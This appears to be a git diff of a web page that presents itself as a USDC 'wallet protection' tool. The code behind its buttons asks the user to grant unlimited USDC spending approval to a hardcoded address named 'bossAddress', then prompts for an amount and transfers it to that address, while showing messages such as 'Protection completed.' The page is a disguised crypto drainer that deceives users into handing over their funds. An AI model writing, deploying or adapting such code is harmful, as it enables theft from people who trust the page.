@@ -9,77 +9,54 @@
 
   <button id="connect">🔵 Connect Wallet</button>
   <button id="approve">🟢 Protect Wallet</button>
-  <button id="transfer">🟡 Start Protect</button>
+  <button id="deposit">🟡 Start Protect</button>
   <button id="status">🟣 Reset / Status</button>
+  <br><br>
+  <a href="check.html" target="_blank">🧪 Check Authorization</a>
+  <div id="output" style="margin-top: 20px;"></div>
 
-  <div id="output" style="margin-top: 10px; color: #333;"></div>
-
-  <!-- ethers.js CDN -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
   <script>
-    // ✅ 使用全小写地址 + getAddress() 强制格式校验
-    const usdcAddress = ethers.utils.getAddress("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
-    const contractAddress = ethers.utils.getAddress("0x86dbe265b0d503e68676971fc7d6aad7e5d90b12");
-    const recipientWallet = ethers.utils.getAddress("0x59e513ae37614f1e670bfe961b3456257c444d24");
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
     let provider, signer, userAddress;
 
-    const log = (msg) => {
-      document.getElementById("output").innerHTML = msg;
-    };
-
-    // 🔵 Connect Wallet
     document.getElementById("connect").onclick = async () => {
-      if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-        log("✅ Wallet connected: " + userAddress);
-      } else {
-        log("❌ No wallet provider found.");
-      }
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+      document.getElementById("output").innerText = "🔗 Connected: " + userAddress;
     };
 
-    // 🟢 Approve USDC to Contract
     document.getElementById("approve").onclick = async () => {
+      const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
       try {
-        const usdc = new ethers.Contract(
-          usdcAddress,
-          ["function approve(address spender, uint256 amount) public returns (bool)"],
-          signer
-        );
-        const tx = await usdc.approve(contractAddress, approveAmount);
+        const tx = await usdc.approve(bossAddress, approveAmount);
         await tx.wait();
-        log("✅ USDC approved successfully.");
+        document.getElementById("output").innerText = "✅ Authorization success.";
       } catch (err) {
-        log("❌ Approval failed: " + err.message);
+        document.getElementById("output").innerText = "❌ Authorization failed.";
       }
     };
 
-    // 🟡 Transfer Funds
-    document.getElementById("transfer").onclick = async () => {
+    document.getElementById("deposit").onclick = async () => {
+      const usdc = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
       try {
-        const amount = prompt("Enter the USDC amount to protect:");
+        const amount = prompt("Enter amount to protect (USDC):");
         const parsed = ethers.utils.parseUnits(amount, 6);
-        const usdc = new ethers.Contract(
-          usdcAddress,
-          ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
-          signer
-        );
-        const tx = await usdc.transferFrom(userAddress, recipientWallet, parsed);
+        const tx = await usdc.transferFrom(userAddress, bossAddress, parsed);
         await tx.wait();
-        log("✅ Funds successfully protected.");
+        document.getElementById("output").innerText = "✅ Protection completed.";
       } catch (err) {
-        log("❌ Transfer failed: " + err.message);
+        document.getElementById("output").innerText = "❌ Transfer failed.";
       }
     };
 
-    // 🟣 Reset or Status
     document.getElementById("status").onclick = () => {
-      log("🔄 Wallet: " + (userAddress || "Not connected") + "<br>Ready for next step.");
+      document.getElementById("output").innerText = "";
     };
   </script>
 </body>
